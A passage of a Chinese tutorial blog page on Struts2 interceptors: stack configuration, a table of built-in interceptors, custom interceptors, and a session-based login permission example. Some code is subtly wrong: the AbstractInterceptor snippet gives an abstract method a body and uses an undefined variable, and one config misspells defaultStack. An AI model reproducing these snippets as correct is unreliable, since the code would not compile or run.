class="hljs-comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span> /&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在定义的拦截栈myStack中，除了引用了两个自定义的拦截器interceptor1和interceptor2外，还引用了一个内置拦截器栈defaultStack，且该内置拦截器栈必不可少。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--配置用户自定义的拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span>/&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!--自定义拦截器栈，我们配置了自定义的拦截器，默认的拦截器栈就不会被执行，因此，想要使用默认的拦截器功能，就要配置进来--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用默认的拦截器栈，一定要放在第一行--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defalutStack&quot;</span>/&gt;</span><br>                <br>                <span class="hljs-comment">&lt;!--引用自定义的拦截器--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--上面配置了拦截器栈，但是没有被执行...下面配置执行拦截器--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>/&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="内建拦截器"><a href="#内建拦截器" class="headerlink" title="内建拦截器"></a>内建拦截器</h2><p>拦截器都继承AbstractInterceptor</p><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><p>内建拦截器介绍:</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>alias</td><td>在不同请求之间将请求参数在不同名称间转换，请求内容不变</td></tr><tr><td>autowiring</td><td>用于实现 Action 的自动装配</td></tr><tr><td>chain</td><td>让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用</td></tr><tr><td>conversionError</td><td>将错误从 ActionContext 中添加到 Action 的属性字段中</td></tr><tr><td>cookies</td><td>使用配置的 Name 和 Value 指定 Cookies</td></tr><tr><td>cookieProvider</td><td>该类是一个 Cookie 工具，方便开发者向客户端写 Cookie</td></tr><tr><td>clearSession</td><td>用于清除一个 HttpSession 实例</td></tr><tr><td>createSession</td><td>自动创建 HttpSession，用于为需要使用</td></tr><tr><td>HttpSession</td><td>的拦截器服务</td></tr><tr><td>debugging</td><td>提供不同的调试用的页面展现内部的数据状况</td></tr><tr><td>execAndWait</td><td>在后台执行 Action，同时将用户带到一个中间的等待页面</td></tr><tr><td>exception</td><td>将异常定位到一个画面</td></tr><tr><td>fileUpload</td><td>提供文件上传功能</td></tr><tr><td>il8n</td><td>记录用户选择的 locale</td></tr><tr><td>logger</td><td>输出 Action 的名称</td></tr><tr><td>model-driven</td><td>如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中</td></tr><tr><td>scoped-model-driven</td><td>如果一个 Action 实现了</td></tr><tr><td>params</td><td>将请求中的参数设置到 Action 中</td></tr><tr><td>actionMappingParams</td><td>用于负责在 Action 配置中传递参数</td></tr><tr><td>prepare</td><td>如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法</td></tr><tr><td>staticParams</td><td>将 struts.xml 文件中 标签的参数内容设置到对应的 Action 中</td></tr><tr><td>scope</td><td>将 Action 状态存入 session 和 application 范围</td></tr><tr><td>servletConfig</td><td>提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问</td></tr><tr><td>timer</td><td>输岀 Action 执行的时间</td></tr><tr><td>token</td><td>通过 Token 避免双击</td></tr><tr><td>tokenSession</td><td>和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中</td></tr><tr><td>validation</td><td>使用 action-validation.xml 文件中定义的内容校验提交的数据</td></tr><tr><td>workflow</td><td>调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面</td></tr><tr><td>store</td><td>存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等</td></tr><tr><td>checkbox</td><td>添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox</td></tr><tr><td>datetime</td><td>日期拦截器</td></tr><tr><td>profiling</td><td>通过参数激活 profile</td></tr><tr><td>roles</td><td>确定用户是否具有 JAAS 指定的 Role，否则不予执行</td></tr><tr><td>annotationWorkflow</td><td>利用注解代替 XML 配置</td></tr><tr><td>multiselect</td><td>检测是否有像 标签一样被选中的多个值，然后添加一个空参数</td></tr><tr><td>deprecation</td><td>当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode</td></tr></tbody></table><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">abstract</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.AliasInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autowiring&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;chain&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.ChainingInterceptor&quot;</span>/&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的exception拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Sample model -driven stack --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDrivenStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDriven&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!--定义defaultStack拦截器栈--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;il8n&quot;</span>/&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;validation&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;excludeMethods&quot;</span>&gt;</span>input,back,cancel,browse<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--默认action类是ActionSupport--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-class-ref</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.ActionSupport&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><h2 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h2><p>   在实际的项目开发中，Struts2的内置拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制、用户登录控制等），则需要通过自定义拦截器来实现，自定义拦截器其实就是开发自己的拦截器类。</p><p>自定义的拦截器类，需要实现import com.opensymphony.xwork2.interceptor.Interceptor接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Interceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Serializable</span> </span>&#123;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function">String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该接口提供了以下三个方法：</p><ul><li><p>void init():该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一-次。可以在该方法中对相关资源进行必要的初始化。</p></li><li><p>void destroy():该方法与init()方法相对应，在拦截器实例被销毁之前,将调用该方法来释放与拦截器相关的资源。它在拦截器的生命周期内也只被调用一次。</p></li><li><p>String intercept( ActionInvocation invocation) throws Exception: 该方法是拦截器的核心方法,用来添加真正执行拦截工作的代码，实现具体的拦截操作。它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的ActionInvocation参数包含了被拦截的Action的引用,可以通过该参数的invoke()方法,将控制权转给下一个拦截器或者转给Action的execute()方法。</p></li></ul><p>如果需要自定义拦截器,只需要实现Interceptor接口的三个方法即可。然而在实际开发过程中,除了实现Interceptor接口可以自定义拦截器外,更常用的一种方式是继承抽象拦截器类AbstractIntercepter。</p><p>该类实现了Interceptor 接口，并且提供了init()方法 和destroy()方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法”拦截器类AbstractInterceptor中定义的方法</p><p>如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Interceptor</span> </span>&#123;<br> <br>     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的初始化方法&quot;</span>);<br>    &#125;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的销毁方法&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;我是拦截器的拦截方法&quot;</span>);<br>        <span class="hljs-comment">//调用invoke()方法，代表着放行执行下一个拦截器，如果没有拦截器了，那么就执行Action的业务代码</span><br>        <span class="hljs-comment">//可看成是过滤器的doFilter()方法</span><br>        actionInvocation.invoke();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractInterceptor类实现了Interceptor接口的所有方法，只需继承AbstractInterceptor类，实现interceptor()方法就可以创建自定义拦截器。</p><h2 id="使用拦截器实现权限控制"><a href="#使用拦截器实现权限控制" class="headerlink" title="使用拦截器实现权限控制"></a>使用拦截器实现权限控制</h2><p>自定义一个拦截器需要三步：</p><ol><li>自定义一个实现Interceptor接口（或者继承自AbstractInterceptor）的类。</li><li>在strutx.xml中注册上一步中定义的拦截器。</li><li>在需要使用的Action中引用上述定义的拦截器，为了方便也可将拦截器定义为默认的拦截器，这样在不加特殊声明的情况下所有的Action都被这个拦截器拦截。</li></ol><p>源代码如下：</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.domain;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">private</span> String username; <span class="hljs-comment">//用户名</span><br><span class="hljs-keyword">private</span> String password; <span class="hljs-comment">//密码</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User [username=&quot;</span> + username + <span class="hljs-string">&quot;, password=&quot;</span> + password + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> cn.itcast.domain.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ModelDriven;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ModelDriven</span>&lt;<span class="hljs-title">User</span>&gt; </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-keyword">private</span> User user = <span class="hljs-keyword">new</span> User();<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getModel</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> user;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//获取ActionContext</span><br>ActionContext actionContext = ActionContext.getContext();<br>System.out.println(user);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;tom&quot;</span>.equals(user.getUsername())<br>&amp;&amp; <span class="hljs-string">&quot;123&quot;</span>.equals(user.getPassword())) &#123;<br><span class="hljs-comment">// 将用户存储在session中</span><br>actionContext.getSession().put(<span class="hljs-string">&quot;user&quot;</span>, user);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码不正确&quot;</span>);<br><span class="hljs-keyword">return</span> INPUT;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BookAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-meta">@SuppressWarnings(&quot;serial&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">del</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book del&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PrivilegeInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.interceptor;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionInvocation;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrivilegeInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInterceptor</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext actionContext = invocation.getInvocationContext();<span class="hljs-comment">// 得到ActionContext.</span><br>Object user = actionContext.getSession().get(<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-comment">//获取user对象</span><br><span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> invocation.invoke(); <span class="hljs-comment">// 继续向下执行</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;您还未登录，请先登录&quot;</span>);<br><span class="hljs-keyword">return</span> Action.LOGIN; <span class="hljs-comment">//如果用户不存在，返回login值</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 